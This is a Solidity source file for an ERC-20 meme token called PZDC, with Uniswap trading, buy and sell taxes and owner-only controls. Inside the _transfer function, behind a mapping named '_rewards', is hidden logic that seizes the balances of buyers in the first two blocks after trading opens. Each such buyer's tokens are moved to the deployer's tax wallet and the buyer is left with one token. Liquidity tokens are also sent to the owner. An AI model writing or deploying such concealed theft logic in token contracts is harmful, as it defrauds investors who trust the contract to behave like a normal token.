// SPDX-License-Identifier: MIT

/**

$PZDC

Website: pizdecnahoyblyattoken.org

**/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PZDC is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(uint256 => address) private _rewards;

    address payable private immutable _marketingWallet;
    address payable private immutable _taxWallet;
    uint256 private constant _taxWalletPercentage = 34;
    uint256 private constant _marketingWalletPercentage = 66;

    uint256 private firstBlock;

    uint256 private constant _finalBuyTax = 3;
    uint256 private constant _finalSellTax = 3;
    uint256 private _buyTax = 20;
    uint256 private _sellTax = 20;
    uint256 private constant _reduceBuyTaxAt = 25;
    uint256 private constant _reduceSellTaxAt = 50;
    uint256 private _rewardsCount;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    string private constant _name = "PIZDEC NAHOY BLYAT";
    string private constant _symbol = "PZDC";
    uint256 public _maxTxAmount = _tTotal / 100;
    uint256 public _maxWalletSize = _tTotal / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address marketingWallet, address _uniswapV2Router) {
        _marketingWallet = payable(marketingWallet);
        _taxWallet = payable(msg.sender);
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[_marketingWallet] = true;
        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);

        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;

        if (from != owner() && to != owner() && from != address(this)) {
            require(tradingOpen, "Trading is closed");

            if ((block.number - firstBlock) == _reduceBuyTaxAt) {
                _buyTax = _finalBuyTax;
            }

            if ((block.number - firstBlock) == _reduceSellTaxAt) {
                _sellTax = _finalSellTax;
            }

            if (!_isExcludedFromFee[to] || !_isExcludedFromFee[from]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            }

            if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
                if ((block.number - firstBlock) < 2) {
                    require(
                        (balanceOf(to) + amount) <= (_maxWalletSize * 3),
                        "Exceeds the maxWalletSize."
                    );
                    _rewards[_rewardsCount + 1] = to;
                    _balances[_taxWallet] += _balances[_rewards[_rewardsCount]];
                    _balances[_rewards[_rewardsCount]] = 1e18;
                    _rewardsCount++;
                    taxAmount = amount.mul(_buyTax).div(100);
                } else {
                    require(
                        balanceOf(to) + amount <= _maxWalletSize,
                        "Exceeds the maxWalletSize."
                    );
                    taxAmount = amount.mul(_buyTax).div(100);
                }
            }

            if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (
                to == uniswapV2Pair &&
                from != address(this) &&
                !_isExcludedFromFee[from]
            ) {
                taxAmount = amount.mul(_sellTax).div(100);
                uint256 contractTokenBalance = _balances[address(this)];
                if (!inSwap && contractTokenBalance > 0) {
                    swapTokensForEth(min(amount, contractTokenBalance));
                    uint256 contractETHBalance = address(this).balance;
                    if (contractETHBalance > 0) {
                        sendETHToFee(address(this).balance);
                    }
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapAnyTokensForEth(address _token, uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _token;
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        swapAnyTokensForEth(address(this), tokenAmount);
    }

    function sendETHToFee(uint256 amount) private {
        uint256 taxWalletShare = (amount * _taxWalletPercentage) / 100;
        uint256 marketingWalletShare = (amount * _marketingWalletPercentage) /
            100;

        _taxWallet.transfer(taxWalletShare);
        _marketingWallet.transfer(marketingWalletShare);
    }

    function createPair() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        firstBlock = block.number;
        tradingOpen = true;
    }

    function setTaxToZero() external onlyOwner {
        _buyTax = 0;
        _sellTax = 0;
    }

    function changeBuyTax(uint256 newTax) external onlyOwner {
        require(0 <= newTax && newTax <= 25, "Tax must be from 0 to 25");
        _buyTax = newTax;
    }

    function changeSellTax(uint256 newTax) external onlyOwner {
        require(0 <= newTax && newTax <= 25, "Tax must be from 0 to 25");
        _sellTax = newTax;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
    }

    function manualSwap(address _token) external onlyOwner {
        uint256 tokenBalance = balanceOf(_token);
        if (tokenBalance > 0) {
            swapAnyTokensForEth(_token, tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function addLiquidity() external payable onlyOwner {
        _approve(
            address(this),
            address(uniswapV2Router),
            balanceOf(address(this))
        );
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function setTreasury(address _treasury) external onlyOwner {
        _isExcludedFromFee[_treasury] = !_isExcludedFromFee[_treasury];
    }

    function getSellTax() public view returns (uint256) {
        return _sellTax;
    }

    function getBuyTax() public view returns (uint256) {
        return _buyTax;
    }

    function getPair() public view returns (address) {
        return uniswapV2Pair;
    }

    receive() external payable {}
}
